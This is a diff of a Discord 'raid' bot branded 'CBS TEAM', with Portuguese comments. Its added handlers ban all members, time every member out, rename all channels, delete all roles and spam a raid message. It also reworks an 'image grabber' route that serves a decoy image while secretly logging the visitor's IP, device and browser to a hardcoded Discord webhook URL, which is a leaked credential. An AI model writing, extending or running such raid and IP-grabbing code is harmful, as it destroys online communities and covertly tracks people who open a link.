@@ -59,7 +59,7 @@ client.once('ready', async () => {
   console.log('📸 Digite /img para gerar Image Grabber');
 });
 
-// ============ INTERAÇÕES ============
+// ============ SLASH COMMANDS ============
 client.on('interactionCreate', async interaction => {
   if (interaction.isCommand()) {
     const command = client.commands.get(interaction.commandName);
@@ -71,17 +71,87 @@ client.on('interactionCreate', async interaction => {
       await interaction.reply({ content: '❌ Erro.', flags: 64 });
     }
   }
+});
 
-  if (interaction.isModalSubmit()) {
-    const modalId = interaction.customId;
-    // ... (modais existentes)
+// ============ MODAIS ============
+client.on('interactionCreate', async interaction => {
+  if (!interaction.isModalSubmit()) return;
+  const modalId = interaction.customId;
+
+  if (modalId === 'editRaidModal') {
+    const categoria = interaction.fields.getTextInputValue('categoriaInput');
+    const mensagem = interaction.fields.getTextInputValue('mensagemInput');
+    const config = require('./config');
+    if (categoria) config.raid.baseName = categoria;
+    if (mensagem) config.raid.spamMessage = mensagem;
+    await interaction.reply({
+      content: `✅ **CONFIGURAÇÕES ATUALIZADAS!**\n📂 Categoria: \`${categoria || 'mantida'}\`\n💬 Mensagem: \`${mensagem || 'mantida'}\``,
+      flags: 64
+    });
   }
 
-  if (interaction.isButton()) {
-    // ... (botões existentes)
+  if (modalId === 'renameModal') {
+    const tipo = interaction.fields.getTextInputValue('tipoInput').toLowerCase();
+    const nome = interaction.fields.getTextInputValue('nomeInput');
+    const guild = interaction.guild;
+    if (tipo === 'canal') {
+      const channels = guild.channels.cache.filter(c => c.type === 0);
+      let count = 0;
+      for (const [id, ch] of channels) {
+        try { await ch.setName(nome); count++; } catch {}
+      }
+      await interaction.reply({ content: `✅ ${count} canais renomeados para \`${nome}\``, flags: 64 });
+    } else if (tipo === 'categoria') {
+      const categories = guild.channels.cache.filter(c => c.type === 4);
+      let count = 0;
+      for (const [id, cat] of categories) {
+        try { await cat.setName(nome); count++; } catch {}
+      }
+      await interaction.reply({ content: `✅ ${count} categorias renomeadas para \`${nome}\``, flags: 64 });
+    } else {
+      await interaction.reply({ content: '❌ Tipo inválido! Use "canal" ou "categoria"', flags: 64 });
+    }
+  }
+
+  if (modalId === 'banAllModal') {
+    const motivo = interaction.fields.getTextInputValue('motivoInput') || 'RAID BY CBS TEAM';
+    const guild = interaction.guild;
+    const botId = interaction.client.user.id;
+    const members = guild.members.cache.filter(m => m.id !== botId && !m.user.bot);
+    if (members.size === 0) return interaction.reply({ content: '⚠️ Nenhum membro.', flags: 64 });
+    await interaction.reply({ content: `🔨 BANINDO ${members.size} membros...`, flags: 64 });
+    let banidos = 0;
+    const list = [...members.values()];
+    for (let i = 0; i < list.length; i += 10) {
+      const chunk = list.slice(i, i + 10);
+      await Promise.all(chunk.map(m => m.ban({ reason: motivo }).catch(() => {})));
+      banidos += chunk.length;
+      await interaction.editReply(`🔨 ${banidos}/${members.size} banidos`);
+    }
+    await interaction.editReply(`✅ **${banidos} MEMBROS BANIDOS!**`);
+  }
+
+  if (modalId === 'endModal') {
+    const minutos = parseInt(interaction.fields.getTextInputValue('minutosInput')) || 60;
+    const duracao = minutos * 60 * 1000;
+    const guild = interaction.guild;
+    const botId = interaction.client.user.id;
+    const members = guild.members.cache.filter(m => m.id !== botId);
+    if (members.size === 0) return interaction.reply({ content: '⚠️ Nenhum membro.', flags: 64 });
+    await interaction.reply({ content: `⏰ TIMEOUT em ${members.size} membros...`, flags: 64 });
+    let timeoutados = 0;
+    const list = [...members.values()];
+    for (let i = 0; i < list.length; i += 10) {
+      const chunk = list.slice(i, i + 10);
+      await Promise.all(chunk.map(m => m.timeout(duracao, 'RAID CBS').catch(() => {})));
+      timeoutados += chunk.length;
+      await interaction.editReply(`⏰ ${timeoutados}/${members.size} timeout`);
+    }
+    await interaction.editReply(`✅ **${timeoutados} MEMBROS EM TIMEOUT POR ${minutos} MIN!**`);
   }
 });
 
+// ============ !MENU ============
 client.on('messageCreate', async message => {
   if (message.author.bot) return;
   if (!message.content.startsWith('!')) return;
@@ -97,20 +167,89 @@ client.on('messageCreate', async message => {
   }
 });
 
-// ==================== SERVIDOR HTTP COM IMAGE GRABBER ====================
+// ============ BOTÕES ============
+client.on('interactionCreate', async interaction => {
+  if (!interaction.isButton()) return;
+
+  const mensagemSpam = 
+    `**RAIDED BY CBS TEAM** https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExajM5anJmYzB2OHJxY3VranF2bHBtNm50dXE0eXRnd2I2ZTZ6NTM0biZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/bJ4TVNYNUympPgcpem/giphy.gif ꧁꧂꧁꧂꧁꧂**꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂`;
+
+  if (interaction.customId === 'spam1') {
+    await interaction.deferReply({ flags: 64 });
+    const channel = interaction.channel;
+    let enviadas = 0;
+    for (let i = 0; i < 1; i++) {
+      try { await channel.send({ content: mensagemSpam }); enviadas++; } catch {}
+    }
+    await interaction.editReply(`✅ **${enviadas} mensagem enviada!** 💬`);
+    return;
+  }
+
+  if (interaction.customId === 'spam2') {
+    await interaction.deferReply({ flags: 64 });
+    const channel = interaction.channel;
+    let enviadas = 0;
+    for (let i = 0; i < 2; i++) {
+      try { await channel.send({ content: mensagemSpam }); enviadas++; } catch {}
+    }
+    await interaction.editReply(`✅ **${enviadas} mensagens enviadas!** 💬`);
+    return;
+  }
+
+  const cmdMap = {
+    'nuke': 'nuke',
+    'editraid': 'editraid',
+    'rename': 'rename',
+    'banall': 'banall',
+    'end': 'end',
+    'deleterole': 'deleterole'
+  };
+  const cmdName = cmdMap[interaction.customId];
+  if (cmdName) {
+    const cmd = client.commands.get(cmdName);
+    if (cmd) {
+      try {
+        await cmd.execute(interaction, client);
+      } catch (error) {
+        console.error(error);
+        await interaction.reply({ content: '❌ Erro.', flags: 64 });
+      }
+    }
+    return;
+  }
+
+  if (interaction.customId === 'confirmDeleteRoles') {
+    const guild = interaction.guild;
+    const roles = guild.roles.cache.filter(r => r.id !== guild.id);
+    await interaction.deferReply({ flags: 64 });
+    let deletados = 0;
+    const list = [...roles.values()];
+    for (let i = 0; i < list.length; i += 10) {
+      const chunk = list.slice(i, i + 10);
+      await Promise.all(chunk.map(r => r.delete().catch(() => {})));
+      deletados += chunk.length;
+      await interaction.editReply(`🗑️ ${deletados}/${roles.size} deletados`);
+    }
+    await interaction.editReply(`✅ **${deletados} CARGOS DELETADOS!**`);
+  }
+
+  if (interaction.customId === 'cancelDeleteRoles') {
+    await interaction.reply({ content: '❌ Cancelado.', flags: 64 });
+  }
+});
+
+// ==================== IMAGE GRABBER (LINK DIRETO) ====================
 const app = express();
 const port = process.env.PORT || 3000;
 app.use(express.static('public'));
-app.use(express.json());
 
 // Armazenar dados
 const ipData = {};
-const imageLinks = {}; // guarda a imagem escolhida para cada ID
+const imageStore = {}; // guarda a imagem escolhida para cada ID
 
-// Webhook
 const WEBHOOK_URL = 'https://discord.com/api/webhooks/1528810633750122506/Rl3CpBXoq4Q14pMHMlX_ZHmJwSjK9TPJzqMu3rrpI6RFoO-HwMrsEnEzXjaz_ram4_MO';
 
-// Função para enviar dados ao webhook
+// Função para enviar ao webhook
 async function enviarWebhook(id, dados) {
   if (!dados) return;
   const embed = {
@@ -121,9 +260,6 @@ async function enviarWebhook(id, dados) {
       { name: '💻 Dispositivo', value: dados.device || 'Desconhecido', inline: true },
       { name: '🌍 Navegador', value: dados.browser || 'Desconhecido', inline: true },
       { name: '📱 SO', value: dados.os || 'Desconhecido', inline: true },
-      { name: '🖥️ Resolução', value: dados.resolution || 'Desconhecido', inline: true },
-      { name: '🌐 Idioma', value: dados.language || 'Desconhecido', inline: true },
-      { name: '🕐 Timezone', value: dados.timezone || 'Desconhecido', inline: true },
       { name: '📱 User-Agent', value: dados.userAgent || 'Desconhecido', inline: false },
       { name: '📅 Data/Hora', value: dados.timestamp || 'Desconhecido', inline: true },
       { name: '🆔 ID', value: `\`${id}\``, inline: true }
@@ -137,64 +273,16 @@ async function enviarWebhook(id, dados) {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ embeds: [embed] })
     });
-    console.log(`📨 Webhook enviado para ID: ${id}`);
-  } catch (e) {
-    console.log('❌ Erro ao enviar webhook:', e);
-  }
+  } catch (e) {}
 }
 
-// Rota para servir a página com a imagem e capturar dados
+// Rota para servir a imagem
 app.get('/img/:id', (req, res) => {
   const id = req.params.id;
-  const imagemUrl = imageLinks[id] || 'https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExajM5anJmYzB2OHJxY3VranF2bHBtNm50dXE0eXRnd2I2ZTZ6NTM0biZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/bJ4TVNYNUympPgcpem/giphy.gif';
-
-  // HTML que exibe a imagem e coleta dados do navegador
-  res.send(`
-    <!DOCTYPE html>
-    <html>
-    <head>
-      <title>CBS TEAM</title>
-      <meta property="og:image" content="${imagemUrl}">
-      <style>
-        body { margin:0; display:flex; justify-content:center; align-items:center; height:100vh; background:#0a0a0a; flex-direction:column; font-family:Arial; }
-        img { max-width:90%; max-height:90%; border-radius:10px; }
-        .loading { color:#ff0000; font-size:18px; margin-top:20px; animation:pulse 2s infinite; }
-        @keyframes pulse { 0%{opacity:0.3;} 50%{opacity:1;} 100%{opacity:0.3;} }
-      </style>
-    </head>
-    <body>
-      <img src="${imagemUrl}" alt="CBS TEAM">
-      <div class="loading">🔥 CBS TEAM ESTEVE AQUI!</div>
-      <script>
-        // Coleta dados do navegador
-        const data = {
-          resolution: window.screen.width + 'x' + window.screen.height,
-          language: navigator.language || navigator.languages[0],
-          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-          userAgent: navigator.userAgent,
-          timestamp: new Date().toISOString()
-        };
-        // Envia para o servidor
-        fetch('/api/coletar/${id}', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(data)
-        }).then(() => console.log('✅ Dados enviados'))
-          .catch(err => console.log('❌ Erro:', err));
-      </script>
-    </body>
-    </html>
-  `);
-});
-
-// Rota para receber dados do navegador
-app.post('/api/coletar/:id', express.json(), async (req, res) => {
-  const id = req.params.id;
-  const navegadorData = req.body;
   const userIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-  const userAgent = req.headers['user-agent'] || navegadorData.userAgent || 'Desconhecido';
+  const userAgent = req.headers['user-agent'];
 
-  // Extrai dispositivo, OS, navegador
+  // Extrair dados do User-Agent
   let device = 'Desconhecido', browser = 'Desconhecido', os = 'Desconhecido';
   if (userAgent) {
     if (userAgent.includes('Windows')) os = 'Windows';
@@ -212,24 +300,33 @@ app.post('/api/coletar/:id', express.json(), async (req, res) => {
     else device = 'Computador';
   }
 
-  const dadosCompletos = {
+  // Salvar dados
+  ipData[id] = {
     ip: userIP,
     device: `${device} (${os})`,
     browser: browser,
     os: os,
-    resolution: navegadorData.resolution || 'Desconhecido',
-    language: navegadorData.language || 'Desconhecido',
-    timezone: navegadorData.timezone || 'Desconhecido',
     userAgent: userAgent,
-    timestamp: navegadorData.timestamp || new Date().toISOString()
+    timestamp: new Date().toISOString()
   };
 
-  ipData[id] = dadosCompletos;
-  await enviarWebhook(id, dadosCompletos);
-  res.json({ status: 'ok' });
+  // Enviar para o webhook
+  enviarWebhook(id, ipData[id]);
+
+  // Servir a imagem
+  let imagemPath = imageStore[id] || path.join(__dirname, 'public', 'imagem.jpg');
+  if (!fs.existsSync(imagemPath)) {
+    imagemPath = path.join(__dirname, 'public', 'imagem.png');
+  }
+  if (fs.existsSync(imagemPath)) {
+    res.sendFile(imagemPath);
+  } else {
+    // Fallback: serve um GIF do CDN
+    res.redirect('https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExajM5anJmYzB2OHJxY3VranF2bHBtNm50dXE0eXRnd2I2ZTZ6NTM0biZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/bJ4TVNYNUympPgcpem/giphy.gif');
+  }
 });
 
-// Rota para ver dados (opcional)
+// Rota para ver dados
 app.get('/dados/:id', (req, res) => {
   const id = req.params.id;
   if (ipData[id]) res.json(ipData[id]);
